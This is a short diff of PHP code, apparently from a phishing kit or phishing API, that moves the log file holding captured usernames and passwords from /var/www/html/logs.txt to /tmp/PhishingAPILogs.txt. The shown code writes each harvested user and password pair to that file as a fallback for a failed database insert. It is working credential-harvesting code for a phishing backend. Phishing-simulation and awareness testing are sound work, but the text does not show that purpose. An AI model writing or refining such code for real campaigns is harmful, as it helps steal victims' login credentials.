@@ -41,7 +41,7 @@ if ($conn->connect_error) {
 if($user != ""){
 
 // Writes User and Password to a Local Log (In Case DB Insert Fails)
-$myfile = fopen("/var/www/html/logs.txt", "a") or die("Unable to open file!");
+$myfile = fopen("/tmp/PhishingAPILogs.txt", "a") or die("Unable to open file!");
 $txt = $user." ".$pass."\n\r\n\r";
 fwrite($myfile, "\n". $txt);
 fclose($myfile);
